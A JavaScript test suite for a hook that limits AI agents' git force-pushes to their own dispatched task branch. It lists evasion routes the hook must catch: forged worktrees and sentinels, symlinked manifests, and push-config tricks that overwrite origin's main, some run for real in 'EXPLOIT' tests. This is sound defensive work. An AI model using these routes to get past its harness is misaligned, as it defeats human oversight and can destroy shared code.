    git(r.wt, 'push', '-q', `--force-with-lease=v1.2.3:${tagBefore}`, 'origin', 'HEAD:v1.2.3');
    const tagAfter = git(r.wt, 'ls-remote', 'origin', 'refs/tags/v1.2.3').split('\t')[0];
    assert.notEqual(tagBefore, tagAfter, 'the unguarded push really overwrote the remote tag');
  });

  it('the hook denies that exploit (and the lease-pinned and refs/notes variants)', () => {
    for (const name of ['v1.2.3', 'notes/commits', 'meta/config']) {
      git(r.wt, 'checkout', '-q', '-B', name);
      const tag = '0123456789abcdef0123456789abcdef01234567';
      for (const cmd of [
        `git push --force-with-lease=${name}:${tag} origin HEAD:${name}`,
        `git push --force-with-lease origin HEAD:${name}`,
        `git push --force-with-lease origin ${name}:${name}`,
        `git push --force-with-lease origin ${name}`,
        `git push --force-with-lease origin HEAD:refs/heads/${name}`,
      ]) {
        assert.ok(denied(run(cmd, { cwd: r.wt, projectDir: r.root })), `${name}: ${cmd}`);
      }
    }
    git(r.wt, 'checkout', '-q', OWN);
  });

  it('a task-named branch is also refused when a local tag / refs/<name> / remote-tracking ref answers to its name', () => {
    for (const ref of [`refs/tags/${OWN}`, `refs/${OWN}`, `refs/remotes/${OWN}`]) {
      git(r.wt, 'update-ref', ref, 'HEAD');
      for (const cmd of [L(), LF()]) {
        assert.ok(denied(run(cmd, { cwd: r.wt, projectDir: r.root })), `${ref}: ${cmd}`);
      }
      git(r.wt, 'update-ref', '-d', ref);
    }
    assert.ok(
      !denied(run(LF(), { cwd: r.wt, projectDir: r.root })),
      'clear again once the alias is gone',
    );
  });

  it('the alias probe failing (git error, not "missing") denies', () => {
    const shim = makeGitShim('verifyfail');
    const out = run(LF(), {
      cwd: r.wt,
      projectDir: r.root,
      env: { ...shim.env, GIT_SHIM_FAIL_VERIFY: '1' },
    });
    assert.ok(denied(out), out);
  });
});

describe('own = the dispatched TASK branch', () => {
  const sentinel = (wt) => join(wt, '.active-task');
  let r;
  before(() => {
    r = makeRepo('taskbind', roleYaml(LEASE));
  });

  it('allows with a matching sentinel (baseline)', () => {
    assert.ok(!denied(run(LF(), { cwd: r.wt, projectDir: r.root })));
  });

  it('denies with no sentinel (operator session), empty or malformed sentinel', () => {
    for (const content of [null, '', '\n', 'not a task id', 'AISDLC-', '../../etc']) {
      if (content === null) rmSync(sentinel(r.wt));
      else writeFileSync(sentinel(r.wt), content);
      assert.ok(denied(run(LF(), { cwd: r.wt, projectDir: r.root })), JSON.stringify(content));
    }
    writeFileSync(sentinel(r.wt), 'AISDLC-1\n');
  });

  it('denies when the agent rewrites .active-task to another task (dir name and branch disagree)', () => {
    writeFileSync(sentinel(r.wt), 'AISDLC-700\n');
    assert.ok(denied(run(LF(), { cwd: r.wt, projectDir: r.root })));
    writeFileSync(sentinel(r.wt), 'AISDLC-1\n');
  });

  it('denies a branch outside the task prefix even with a consistent sentinel and directory', () => {
    const dir = join(r.root, '.worktrees', 'aisdlc-7');
    git(r.root, 'worktree', 'add', '-q', '-b', 'feat/not-a-task-branch', dir);
    writeFileSync(join(dir, '.active-task'), 'AISDLC-7\n');
    const wt7 = realpathSync(dir);
    assert.ok(
      denied(
        run('git push --force-with-lease origin feat/not-a-task-branch', {
          cwd: wt7,
          projectDir: r.root,
        }),
      ),
    );
  });

  it('denies when the worktree directory is not named after the task', () => {
    const dir = join(r.root, '.worktrees', 'scratch');
    git(r.root, 'worktree', 'add', '-q', '-b', 'ai-sdlc/aisdlc-8-x', dir);
    writeFileSync(join(dir, '.active-task'), 'AISDLC-8\n');
    const wt8 = realpathSync(dir);
    assert.ok(
      denied(
        run('git push --force-with-lease origin ai-sdlc/aisdlc-8-x', {
          cwd: wt8,
          projectDir: r.root,
        }),
      ),
    );
  });
});

describe('an internal error while evaluating a push is a DENY, not an allow', () => {
  it('a throwing guard (injected via a preload) denies git push but not unrelated commands', () => {
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'lease-throw-')));
    try {
      const guardPath = join(__dirname, 'lib', 'lease-push-guard.js');
      const preload = join(dir, 'preload.cjs');
      writeFileSync(
        preload,
        `const m = require(${JSON.stringify(guardPath)});\nm.evaluateLeasePush = () => { throw new Error('boom'); };\n`,
      );
      const env = { NODE_OPTIONS: `--require ${preload}` };
      const o = { cwd: leaseRepo.wt, projectDir: leaseRepo.root, env };
      assert.ok(denied(run(L(), o)));
      assert.ok(denied(run(LF(), o)));
      assert.ok(!denied(run('echo hi', o)));
      assert.ok(!denied(run('ls', o)));
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('worktree authenticity (forged bindings)', () => {
  let r;
  before(() => {
    r = makeRepo('forge', roleYaml(LEASE));
  });
  const push = (b) => `git push --force-with-lease origin ${b}`;

  it('legit .worktrees/<id> worktree is allowed (baseline)', () => {
    assert.ok(!denied(run(L(), { cwd: r.wt, projectDir: r.root })));
  });

  it('REPRODUCTION + regression: a forged worktree OUTSIDE .worktrees bound to another task is denied', () => {
    const B = 'ai-sdlc/aisdlc-700-x';
    const forged = join(base, 'forged-x', 'aisdlc-700');
    git(r.root, 'worktree', 'add', '-q', '-b', B, forged);
    writeFileSync(join(forged, '.active-task'), 'AISDLC-700\n');
    const cwd = realpathSync(forged);
    // Everything the three-way binding checks agrees (sentinel, dir name, branch)...
    assert.equal(git(cwd, 'symbolic-ref', '-q', 'HEAD'), `refs/heads/${B}`);
    // ...but the directory is not a dispatched worktree under <main>/.worktrees/.
    assert.ok(denied(run(push(B), { cwd, projectDir: r.root })));
    assert.ok(denied(run(push(B), { cwd, projectDir: cwd })));
  });

  it('a worktree whose .git file points at a hand-forged gitdir (commondir -> real repo) is denied', () => {
    const B = 'ai-sdlc/aisdlc-701-x';
    const dir = join(r.root, '.worktrees', 'aisdlc-701');
    const fake = join(base, 'fake-gitdir');
    mkdirSync(dir, { recursive: true });
    mkdirSync(fake, { recursive: true });
    writeFileSync(join(fake, 'HEAD'), `ref: refs/heads/${B}\n`);
    writeFileSync(join(fake, 'commondir'), `${join(r.root, '.git')}\n`);
    writeFileSync(join(fake, 'gitdir'), `${join(dir, '.git')}\n`);
    writeFileSync(join(dir, '.git'), `gitdir: ${fake}\n`);
    writeFileSync(join(dir, '.active-task'), 'AISDLC-701\n');
    const cwd = realpathSync(dir);
    // Precondition: git really accepts the forgery as a checkout of that branch.
    assert.equal(git(cwd, 'symbolic-ref', '-q', 'HEAD'), `refs/heads/${B}`);
    assert.ok(denied(run(push(B), { cwd, projectDir: r.root })));
  });

  it('a symlinked .worktrees entry pointing at a real worktree elsewhere is denied', () => {
    const B = 'ai-sdlc/aisdlc-5-x';
    const real = join(base, 'elsewhere', 'aisdlc-5');
    git(r.root, 'worktree', 'add', '-q', '-b', B, real);
    writeFileSync(join(real, '.active-task'), 'AISDLC-5\n');
    const link = join(r.root, '.worktrees', 'aisdlc-5');
    symlinkSync(real, link);
    assert.ok(denied(run(push(B), { cwd: link, projectDir: r.root })));
    assert.ok(denied(run(push(B), { cwd: realpathSync(real), projectDir: r.root })));
  });

  it('project dir outside the main checkout / .worktrees is denied', () => {
    const outside = join(base, 'forged-x', 'aisdlc-700');
    assert.ok(denied(run(L(), { cwd: r.wt, projectDir: realpathSync(outside) })));
  });

  it('an operator main checkout (not under .worktrees) gets no lease push even on a task-named branch', () => {
    const op = makeRepo('opmain', roleYaml(LEASE));
    // Main checkout itself on a task-named branch with a sentinel and a matching directory name.
    const mainDir = join(base, 'opmain');
    const dirNamed = join(base, 'aisdlc-9');
    git(base, 'init', '-q', '-b', 'main', dirNamed);
    mkdirSync(join(dirNamed, '.ai-sdlc'), { recursive: true });
    writeFileSync(join(dirNamed, '.ai-sdlc', 'agent-role.yaml'), roleYaml(LEASE));
    git(dirNamed, ...['-c', 'user.name=t', '-c', 'user.email=t@example.invalid'], 'add', '-A');
    git(
      dirNamed,
      '-c',
      'user.name=t',
      '-c',
      'user.email=t@example.invalid',
      'commit',
      '-q',
      '-m',
      'i',
    );
    git(dirNamed, 'checkout', '-q', '-b', 'ai-sdlc/aisdlc-9-x');
    git(dirNamed, 'remote', 'add', 'origin', join(base, 'opmain-origin.git'));
    writeFileSync(join(dirNamed, '.active-task'), 'AISDLC-9\n');
    const cwd = realpathSync(dirNamed);
    assert.ok(denied(run(push('ai-sdlc/aisdlc-9-x'), { cwd, projectDir: cwd })));
    void op;
    void mainDir;
  });
});

describe('gh-issue task ids', () => {
  it('allows gh-issue-N with dir .worktrees/gh-issue-N and branch ai-sdlc/gh-issue-N-slug', () => {
    const r = makeRepo('ghissue', roleYaml(LEASE));
    const B = 'ai-sdlc/gh-issue-42-fix-thing';
    const dir = join(r.root, '.worktrees', 'gh-issue-42');
    git(r.root, 'worktree', 'add', '-q', '-b', B, dir);
    writeFileSync(join(dir, '.active-task'), 'gh-issue-42\n');
    const cwd = realpathSync(dir);
    const cmd = `git push --force-with-lease origin HEAD:refs/heads/${B}`;
    assert.ok(!denied(run(cmd, { cwd, projectDir: r.root })));
    // mismatched id still denies
    writeFileSync(join(dir, '.active-task'), 'gh-issue-43\n');
    assert.ok(denied(run(cmd, { cwd, projectDir: r.root })));
  });
});

describe('config-mapped no-colon refspec: why only the explicit destination is accepted (real git)', () => {
  const BR = 'ai-sdlc/aisdlc-663.2-test';
  const EXPLICIT = `git push --force-with-lease origin HEAD:refs/heads/${BR}`;
  const NOCOLON = `git push --force-with-lease origin ${BR}`;
  const ID = [
    '-c',
    'user.name=t',
    '-c',
    'user.email=t@example.invalid',
    'commit',
    '-q',
    '--allow-empty',
    '-m',
  ];
  let root;
  let wt;
  let other;
  let bare;
  let mainSha;

  const remoteRef = (ref) => {
    const out = git(root, 'ls-remote', bare, ref);
    return out ? out.split('\t')[0] : '';
  };
  /** Puts the origin's main back to the known advanced commit (force, from a second clone). */
  const resetMain = () => {
    git(other, 'fetch', '-q', 'origin');
    git(other, 'push', '-q', '--force', 'origin', `${mainSha}:refs/heads/main`);
    git(wt, 'fetch', '-q', 'origin'); // keep the lease's remote-tracking expectation current
  };
  const tryGit = (cwd, ...args) => {
    try {
      return { ok: true, out: git(cwd, ...args) };
    } catch (err) {
      return { ok: false, out: String(err.stderr || err.message) };
    }
  };

  before(() => {
    bare = join(base, 'cfgmap-origin.git');
    git(base, 'init', '-q', '--bare', '-b', 'main', bare);
    root = join(base, 'cfgmap');
    git(base, 'clone', '-q', bare, root);
    git(root, 'checkout', '-q', '-B', 'main');
    mkdirSync(join(root, '.ai-sdlc'), { recursive: true });
    writeFileSync(join(root, '.ai-sdlc', 'agent-role.yaml'), roleYaml(LEASE));
    git(root, 'add', '-A');
    git(root, ...ID, 'base');
    git(root, 'push', '-q', '-u', 'origin', 'main');
    root = realpathSync(root);
    other = join(base, 'cfgmap-other');
    git(base, 'clone', '-q', bare, other);
    // Created exactly like the pipeline does: tracking origin/main (branch.<BR>.merge = refs/heads/main).
    const dir = join(root, '.worktrees', 'aisdlc-663.2');
    git(root, 'worktree', 'add', '-q', dir, '-b', BR, 'origin/main');
    writeFileSync(join(dir, '.active-task'), 'AISDLC-663.2\n');
    wt = realpathSync(dir);
    // Main advances elsewhere, then the task branch gets its own commit: they diverge.
    git(other, ...ID, 'main moved on');
    git(other, 'push', '-q', 'origin', 'main');
    mainSha = remoteRef('refs/heads/main');
    git(wt, ...ID, 'task work');
    git(wt, 'fetch', '-q', 'origin');
  });

  it('precondition: the task branch tracks main and the dotted sub-id layout is accepted end to end', () => {
    assert.equal(git(wt, 'config', `branch.${BR}.merge`), 'refs/heads/main');
    assert.ok(!denied(run(EXPLICIT, { cwd: wt, projectDir: root })));
    assert.ok(!denied(run(EXPLICIT, { cwd: wt, projectDir: wt })));
  });

  for (const [key, value] of [
    ['push.default', 'upstream'],
    ['push.default', 'tracking'],
    ['remote.origin.push', 'refs/heads/ai-sdlc/aisdlc-663.2-test:refs/heads/main'],
  ]) {
    it(`EXPLOIT (${key}=${value}): the unguarded no-colon push force-updates origin's main; the guard denies it`, () => {
      git(wt, 'config', key, value);
      try {
        // 1. Prove the exploit: the sanctioned-looking command really hits main.
        assert.equal(remoteRef('refs/heads/main'), mainSha);
        git(wt, 'push', '--force-with-lease', 'origin', BR);
        const after = remoteRef('refs/heads/main');
        assert.equal(
          after,
          git(wt, 'rev-parse', 'HEAD'),
          'origin main was overwritten with the task commit',
        );
        assert.notEqual(after, mainSha);
        resetMain();
        // 2. The guard denies that command (and the -u / lease-value variants)...
        for (const cmd of [
          NOCOLON,
          `git push --force-with-lease -u origin ${BR}`,
          `git push --force-with-lease=${BR}:${mainSha} origin ${BR}`,
          `git push --force-with-lease origin refs/heads/${BR}`,
        ]) {
          const out = run(cmd, { cwd: wt, projectDir: root });
          assert.ok(denied(out), cmd);
          assert.match(out, /HEAD:refs\/heads\//, 'the deny message names the accepted spelling');
        }
        // 2b. Bare `HEAD` and the omitted remote/refspec forms are denied too: git maps
        // them through the config (see the tag-named-HEAD test below).
        for (const cmd of [
          'git push --force-with-lease origin HEAD',
          'git push --force-with-lease origin',
          'git push --force-with-lease',
        ]) {
          assert.ok(denied(run(cmd, { cwd: wt, projectDir: root })), `refused: ${cmd}`);
        }
        // 3. ...while the explicit form ignores the config and touches only the task branch.
        for (const [cmd, args] of [[EXPLICIT, ['HEAD:refs/heads/' + BR]]]) {
          assert.ok(!denied(run(cmd, { cwd: wt, projectDir: root })), cmd);
          git(wt, 'push', '--force-with-lease', 'origin', ...args);
          assert.equal(remoteRef('refs/heads/main'), mainSha, `main untouched by: ${cmd}`);
          assert.equal(remoteRef(`refs/heads/${BR}`), git(wt, 'rev-parse', 'HEAD'));
        }
      } finally {
        git(wt, 'config', '--unset-all', key);
        resetMain();
      }
    });
  }

  it('bare HEAD and omitted-refspec pushes are refused at the hook with no real tag (every git version)', () => {
    // Needs no tag named HEAD: the refusal is a property of the guard, not of git's ref
    // resolution, so it is proven the same way on every git version. The agent-set
    // remote.origin.push is the config the exploit below relies on.
    git(wt, 'config', 'remote.origin.push', 'refs/tags/HEAD:refs/heads/main');
    try {
      const o = { cwd: wt, projectDir: root };
      assert.ok(denied(run('git push --force-with-lease origin HEAD', o)), 'bare HEAD refused');
      assert.ok(denied(run('git push --force-with-lease', o)), 'omitted refspec refused');
      assert.ok(denied(run('git push --force-with-lease origin', o)), 'omitted refspec refused');
      assert.ok(!denied(run(`git push --force-with-lease origin HEAD:refs/heads/${BR}`, o)));
    } finally {
      git(wt, 'config', '--unset-all', 'remote.origin.push');
      resetMain();
    }
  });

  it('EXPLOIT (ref named HEAD + remote.origin.push): bare HEAD overwrites main in real git; the guard refuses it', () => {
    // A local ref refs/tags/HEAD makes the no-colon `HEAD` resolve to it, and the agent-set
    // remote.origin.push maps it to main. `git tag HEAD` is refused by newer git ("not a
    // valid tag name"), so the ref is created with update-ref. If a git version refuses
    // that too, the exploit cannot be set up there: assert that refusal instead of skipping.
    let created = true;
    try {
      git(wt, 'update-ref', 'refs/tags/HEAD', 'HEAD');
    } catch (err) {
      created = false;
      assert.match(String(err.stderr ?? err.message ?? err), /HEAD|refname|invalid|valid/i);
      assert.equal(
        git(wt, 'for-each-ref', 'refs/tags/HEAD').trim(),
        '',
        'no refs/tags/HEAD exists, so the exploit cannot be set up on this git',
      );
    }
    git(wt, 'config', 'remote.origin.push', 'refs/tags/HEAD:refs/heads/main');
    try {
      const o = { cwd: wt, projectDir: root };
      assert.ok(denied(run('git push --force-with-lease origin HEAD', o)), 'bare HEAD refused');
      assert.ok(denied(run('git push --force-with-lease', o)), 'omitted refspec refused');
      if (created) {
        // Proof the shape was dangerous: unguarded, git either really moves origin's main or
        // itself refuses the ambiguous name. Both outcomes are asserted; main never stays
        // unchanged while the push reports success.
        const before = remoteRef('refs/heads/main');
        let pushed = true;
        try {
          git(wt, 'push', '--force-with-lease', 'origin', 'HEAD');
        } catch {
          pushed = false;
        }
        if (pushed) {
          assert.equal(remoteRef('refs/heads/main'), git(wt, 'rev-parse', 'HEAD'));
        } else {
          assert.equal(remoteRef('refs/heads/main'), before, 'git refused; main untouched');
        }
      }
    } finally {
      git(wt, 'config', '--unset-all', 'remote.origin.push');
      if (created) git(wt, 'update-ref', '-d', 'refs/tags/HEAD');
      resetMain();
    }
  });

  it('explicit-form variants at the hook: lease value, short destination, main, +refspec', () => {
    const sha = mainSha.slice(0, 12);
    const o = { cwd: wt, projectDir: root };
    assert.ok(
      !denied(run(`git push --force-with-lease=${BR}:${sha} origin HEAD:refs/heads/${BR}`, o)),
    );
    for (const cmd of [
      `git push --force-with-lease=main:${sha} origin HEAD:refs/heads/${BR}`,
      `git push --force-with-lease origin HEAD:${BR}`,
      `git push --force-with-lease origin HEAD:refs/heads/main`,
      `git push --force-with-lease origin +HEAD:refs/heads/${BR}`,
    ]) {
      assert.ok(denied(run(cmd, o)), cmd);
    }
  });

  it('other push-affecting config, with the explicit refspec: reasoned and pinned', () => {
    // push.followTags: only adds tags missing on the remote, cannot overwrite an existing ref.
    git(wt, 'config', 'push.followTags', 'true');
    // push.pushOption / push.negotiate / transfer.*: transport tuning that never changes which
    // ref moves (push options need server support, so they are not exercised here).
    try {
      git(wt, 'push', '--force-with-lease', 'origin', `HEAD:refs/heads/${BR}`);
      assert.equal(remoteRef('refs/heads/main'), mainSha);
    } finally {
      git(wt, 'config', '--unset-all', 'push.followTags');
    }
    // remote.origin.mirror=true: git refuses an explicit refspec outright, so nothing is pushed.
    git(wt, 'config', 'remote.origin.mirror', 'true');
    try {
      const r = tryGit(wt, 'push', '--force-with-lease', 'origin', `HEAD:refs/heads/${BR}`);
      assert.equal(r.ok, false, 'git aborts');
      assert.equal(remoteRef('refs/heads/main'), mainSha);
    } finally {
      git(wt, 'config', '--unset-all', 'remote.origin.mirror');
    }
  });

  it("remote.origin.pushurl redirects the push to a DIFFERENT repo: not this guard's boundary (documented)", () => {
    const elsewhere = join(base, 'cfgmap-elsewhere.git');
    git(base, 'init', '-q', '--bare', '-b', 'main', elsewhere);
    git(wt, 'config', 'remote.origin.pushurl', elsewhere);
    try {
      git(wt, 'push', 'origin', `HEAD:refs/heads/${BR}`);
      assert.equal(remoteRef('refs/heads/main'), mainSha, 'origin main untouched');
      assert.ok(
        git(wt, 'ls-remote', elsewhere, `refs/heads/${BR}`).length > 0,
        'went to the other repo',
      );
    } finally {
      git(wt, 'config', '--unset-all', 'remote.origin.pushurl');
    }
  });

  it('under never nothing changed: lease pushes stay blocked, no git subprocess runs', () => {
    const nv = makeRepo('cfgmap-never', roleYaml(NEVER));
    const shim = makeGitShim('cfgnever');
    for (const cmd of [NOCOLON, EXPLICIT]) {
      const out = run(cmd, { cwd: nv.wt, projectDir: nv.root, env: shim.env });
      assert.ok(denied(out), cmd);
    }
    assert.equal(calls(shim), '');
  });
});

// ── AISDLC-756 — main-rooted hierarchy executor bound to its inflight claim ──

describe('main-rooted hierarchy executor: lease push bound to the inflight claim (AISDLC-756)', () => {
  let r;
  let wt2;
  const SESSION = 'proj-executor-alpha';
  const exec = (over = {}) => ({
    env: {
      AI_SDLC_ACTIVE_TASK_ID: '',
      AI_SDLC_HIERARCHY_SESSION: SESSION,
      AI_SDLC_HIERARCHY_ROLE: 'executor',
      ...over,
    },
  });
  const dispatchDir = () => join(r.root, '.ai-sdlc', 'dispatch');
  const inflightDir = () => join(dispatchDir(), 'inflight');
  const claim = (taskId, workerId) => {
    mkdirSync(inflightDir(), { recursive: true });
    writeFileSync(join(inflightDir(), `${taskId}.dispatch.json`), '{}');
    writeFileSync(
      join(inflightDir(), `${taskId}.state.json`),
      JSON.stringify({ taskId, workerId, workerKind: 'any' }),
    );
  };
  const push = (opts) => run(L(), { cwd: r.wt, projectDir: r.root, ...opts });
  const reset = () => rmSync(dispatchDir(), { recursive: true, force: true });

  before(() => {
    r = makeRepo('hier756', roleYaml(LEASE));
    wt2 = addTaskWorktree(r.root, 2);
  });
  after(() => reset());

  it('allowed with a matching inflight claim (session with or without the project prefix)', () => {
    reset();
    claim('AISDLC-1', 'executor-alpha');
    assert.ok(!denied(push(exec())));
    assert.ok(!denied(push(exec({ AI_SDLC_HIERARCHY_SESSION: 'executor-alpha' }))));
    reset();
  });

  it('refused with no claim on the board', () => {
    reset();
    assert.ok(denied(push(exec())));
  });

  it('refused when the claim belongs to another executor', () => {
    reset();
    claim('AISDLC-1', 'executor-beta');
    assert.ok(denied(push(exec())));
  });

  it('refused when the same name holds two claims', () => {
    reset();
    claim('AISDLC-1', 'executor-alpha');
    claim('AISDLC-2', 'executor-alpha');
    assert.ok(denied(push(exec())));
    assert.ok(denied(run(L(), { cwd: wt2, projectDir: r.root, ...exec() })));
    reset();
  });

  it('refused when the claim is for a different task', () => {
    reset();
    claim('AISDLC-2', 'executor-alpha');
    assert.ok(denied(push(exec())));
    reset();
  });

  it('refused for dispatch, planner or an unset role or session', () => {
    reset();
    claim('AISDLC-1', 'executor-alpha');
    for (const role of ['operator-dispatch', 'planner', '']) {
      assert.ok(denied(push(exec({ AI_SDLC_HIERARCHY_ROLE: role }))), role);
    }
    assert.ok(denied(push(exec({ AI_SDLC_HIERARCHY_SESSION: '' }))));
    reset();
  });

  it('refused when the manifest path is tampered (symlinked manifest or symlinked inflight dir)', () => {
    reset();
    mkdirSync(inflightDir(), { recursive: true });
    const outside = join(base, 'hier756-outside');
    mkdirSync(join(outside, 'inflight'), { recursive: true });
    writeFileSync(join(outside, 'real.dispatch.json'), '{}');
    symlinkSync(join(outside, 'real.dispatch.json'), join(inflightDir(), 'AISDLC-1.dispatch.json'));
    writeFileSync(
      join(inflightDir(), 'AISDLC-1.state.json'),
      JSON.stringify({ taskId: 'AISDLC-1', workerId: 'executor-alpha' }),
    );
    assert.ok(denied(push(exec())), 'symlinked manifest');
    reset();
    mkdirSync(dispatchDir(), { recursive: true });
    writeFileSync(join(outside, 'inflight', 'AISDLC-1.dispatch.json'), '{}');
    writeFileSync(
      join(outside, 'inflight', 'AISDLC-1.state.json'),
      JSON.stringify({ taskId: 'AISDLC-1', workerId: 'executor-alpha' }),
    );
    symlinkSync(join(outside, 'inflight'), inflightDir());
    assert.ok(denied(push(exec())), 'symlinked inflight dir');
    reset();
  });

  it('the AI_SDLC_ACTIVE_TASK_ID binding is unchanged', () => {
    reset();
    const bound = (id) => ({ env: { AI_SDLC_ACTIVE_TASK_ID: id } });
    assert.ok(!denied(push(bound('AISDLC-1'))));
    assert.ok(denied(push(bound('AISDLC-2'))));
    assert.ok(denied(push(bound(''))));
  });

  it('the refusal text names both bindings and a next step', () => {
    reset();
    const out = push(exec());
    const reason = JSON.parse(out).hookSpecificOutput.permissionDecisionReason;
    assert.match(reason, /bound to the session at launch/);
    assert.match(reason, /hierarchy executor/);
    assert.match(reason, /inflight claim/);
    assert.match(reason, /\/ai-sdlc executor/);
    assert.match(reason, /rooted in the worktree/);
  });

  it('other push shapes stay refused even with a claim', () => {
    reset();
    claim('AISDLC-1', 'executor-alpha');
    for (const cmd of [
      `git push --force origin ${OWN}`,
      `git push --force-with-lease origin ${OWN}`,
      'git push --force-with-lease origin HEAD:refs/heads/main',
      'git push --force-with-lease origin',
    ]) {
      assert.ok(denied(run(cmd, { cwd: r.wt, projectDir: r.root, ...exec() })), cmd);
    }
    reset();
  });
});
